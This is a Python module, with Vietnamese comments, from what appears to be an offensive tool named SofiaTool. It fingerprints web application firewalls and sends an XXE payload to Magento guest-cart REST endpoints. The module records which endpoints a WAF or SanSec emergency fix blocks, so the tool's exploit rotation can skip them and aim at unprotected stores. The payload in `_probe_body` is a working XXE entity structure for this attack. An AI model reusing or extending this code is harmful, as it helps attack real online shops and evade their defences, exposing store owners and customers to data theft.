"""SofiaTool v2 — PHA 3: WAF detection (per target).

passive_fingerprint() — đọc headers + block-page HTML, map sang WAF_SIGNATURES.
active_probe()        — gửi XML "ngu" (rõ ràng là XXE) tới 4 endpoint, xem
                        endpoint nào bị 403/406/429 chặn hoặc 503-fix (SanSec
                        trả 503 cho body chứa "sourceData") → trả
                        (blocks_xml, blocked_endpoints) cho rotation skip.
"""
import re

import requests
import urllib3

from core import config
from core.logger import get_logger

log = get_logger()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WAF_SIGNATURES = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid", "server: cloudflare"],
        "body": re.compile(r"cloudflare|cf-error-details|__cf_chl_", re.I),
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amzn-waf-action"],
        "body": re.compile(r"awswaf|Request blocked by AWS WAF", re.I),
    },
    "imperva": {
        "headers": ["x-iinfo", "x-cdn", "incap_ses", "visid_incap"],
        "body": re.compile(r"imperva|incapsula", re.I),
    },
    "akamai": {
        "headers": ["x-akamai-transformed", "x-akamai-request-id"],
        "body": re.compile(r"akamai|_abck=|bm_sz=", re.I),
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache", "sucuri_cloudproxy"],
        "body": re.compile(r"sucuri|cloudproxy", re.I),
    },
    "modsecurity": {
        "headers": ["x-modsec", "server: mod_security"],
        "body": re.compile(r"mod_security|modsecurity|error id: \d+", re.I),
    },
    "cloudbric": {
        "headers": ["x-cbwaf", "cloudbric"],
        "body": re.compile(r"cloudbric", re.I),
    },
    "bitninja": {
        "headers": ["x-bitninja", "bitninja"],
        "body": re.compile(r"bitninja", re.I),
    },
    "fastly": {
        "headers": ["x-fastly-request-id", "fastly-io", "x-served-by: cache-",
                    "server: fastly"],
        "body": re.compile(r"fastly|via: 1.1 varnish", re.I),
    },
    "azure": {
        "headers": ["x-ms-request-id", "x-azure-ref", "x-msedge-ref",
                    "azurefd", "server: kestrel"],
        "body": re.compile(r"azure|front door|microsoft azure", re.I),
    },
    "f5": {
        "headers": ["x-f5-asm", "x-wa-info", "server: bigip", "x-cnection"],
        "body": re.compile(r"big-?ip|f5 networks|asm#\d+|security policy violation", re.I),
    },
    "barracuda": {
        "headers": ["x-barracuda", "set-cookie: barra_counter_session",
                    "set-cookie: barra_vid"],
        "body": re.compile(r"barracuda", re.I),
    },
    "wordfence": {
        "headers": ["x-wordfence", "set-cookie: wfvt_", "set-cookie: wordfence_verifiedHuman"],
        "body": re.compile(r"wordfence|blocked by wordfence", re.I),
    },
    "yundun": {
        "headers": ["x-yundun", "aliyundun", "x-aliyundun"],
        "body": re.compile(r"yundun|阿里云盾|aliyun waf", re.I),
    },
    "safedog": {
        "headers": ["safedog-flow-item", "set-cookie: safedog-flow-item",
                    "x-safedog"],
        "body": re.compile(r"safedog|安全狗", re.I),
    },
    "360wzws": {
        "headers": ["360wzws", "x-360-wzws", "x-wzws"],
        "body": re.compile(r"360wzws|网站卫士", re.I),
    },
    "gcore": {
        "headers": ["x-gcore", "server: gcore"],
        "body": re.compile(r"gcore", re.I),
    },
    "ddosguard": {
        "headers": ["x-ddos-guard", "ddos-guard", "server: ddos-guard"],
        "body": re.compile(r"ddos-?guard", re.I),
    },
    "cloudfront": {
        "headers": ["x-amz-cf-id", "x-amz-cf-pop", "x-cache: cloudfront"],
        "body": re.compile(r"cloudfront", re.I),
    },
    "varnish": {
        "headers": ["x-varnish", "x-vcl", "via: varnish"],
        "body": re.compile(r"varnish|vcl error", re.I),
    },
    "litespeed": {
        "headers": ["x-litespeed-cache", "server: litespeed", "x-litespeed"],
        "body": re.compile(r"litespeed", re.I),
    },
    "citrix": {
        "headers": ["x-ns-", "set-cookie: citrix_ns_id", "set-cookie: ns_af"],
        "body": re.compile(r"netscaler|citrix", re.I),
    },
}

# Header regex đã chuẩn hóa: lowercase header name, so sánh chuỗi con
_BLOCK_STATUS = {403, 406, 429}
_FIX_STATUS = {503}  # SanSec emergency fix: 503 cho body chứa "sourceData"

# Probe endpoints — khớp normalized key với exploit/endpoints.rotation (skip).
_PROBE_ENDPOINTS = [
    "/rest/V1/guest-carts/{cart}/estimate-shipping-methods",
    "/rest/all/V1/guest-carts/{cart}/estimate-shipping-methods",
    "/rest/V1/guest-carts/{cart}/billing-address",
    "/rest/V1/guest-carts/{cart}/totals-information",
]
_PROBE_CART = "sofia-probe"


def passive_fingerprint(base, sess=None):
    """Trả engine WAF phát hiện được (hoặc None) + danh sách tín hiệu."""
    sess = sess or requests.Session()
    found = []
    try:
        r = sess.get(base + "/", timeout=config.TIMEOUT, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}
        body = r.text[:150_000]
        server = headers.get("server", "")
        for engine, sig in WAF_SIGNATURES.items():
            hit = False
            for h in sig["headers"]:
                if ":" in h:  # dạng "server: cloudflare"
                    name, _, val = h.partition(":")
                    if headers.get(name.strip()) and val.strip() in headers[name.strip()].lower():
                        hit = True
                        break
                elif h in headers:
                    hit = True
                    break
            if not hit and sig["body"].search(body):
                hit = True
            if hit:
                found.append(engine)
    except requests.RequestException as e:
        log.debug("passive fingerprint fail: %s", e)
    return found


def _probe_body():
    """Body XML rõ ràng (không callback thật, URL nội bộ không tồn tại)."""
    return {
        "address": {
            "totalsCollector": {
                "collectorList": {
                    "totalCollector": {
                        "sourceData": {
                            "data": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://127.0.0.1:1/x.dtd"> %sp; %param1;]><r/>',
                            "options": 12345678,
                        }
                    }
                }
            }
        }
    }


def active_probe(base, sess=None):
    """Gửi XML payload tới 4 endpoint — xem endpoint nào bị WAF chặn/fix.

    Trả (blocks_xml, blocked_endpoints):
      blocks_xml        — có endpoint nào chặn/fix body XML không
      blocked_endpoints — list normalized endpoint key bị chặn (rotation skip)
    """
    sess = sess or requests.Session()
    import json as _json
    body = _json.dumps(_probe_body())
    blocked = []
    for tpl in _PROBE_ENDPOINTS:
        ep = tpl.format(cart=_PROBE_CART)
        try:
            r = sess.post(
                f"{base}{ep}", data=body.encode("utf-8"),
                timeout=config.TIMEOUT, verify=False,
                headers={"Content-Type": "application/json",
                         "User-Agent": config.USER_AGENT},
            )
        except requests.RequestException:
            continue
        is_block = r.status_code in _BLOCK_STATUS or (
            r.status_code in _FIX_STATUS and "sourceData" in body)
        if is_block:
            blocked.append(tpl.format(cart="{cart}"))
            log.info("probe: endpoint BLOCKED/FIXED (%s) %s", r.status_code, ep)
    blocks_xml = bool(blocked)
    if blocks_xml:
        log.info("probe: %d/%d endpoint chặn XML body (%s)",
                 len(blocked), len(_PROBE_ENDPOINTS), base)
    return blocks_xml, blocked


def detect(base, sess=None):
    """Kết hợp: trả dict {engine, engines, blocks_xml, blocked_endpoints}."""
    engines = passive_fingerprint(base, sess)
    blocks_xml, blocked_endpoints = active_probe(base, sess)
    engine = engines[0] if engines else None
    log.info("WAF detect %s -> engine=%s blocks_xml=%s blocked=%d",
             base, engine, blocks_xml, len(blocked_endpoints))
    return {"engine": engine, "engines": engines, "blocks_xml": blocks_xml,
            "blocked_endpoints": blocked_endpoints}

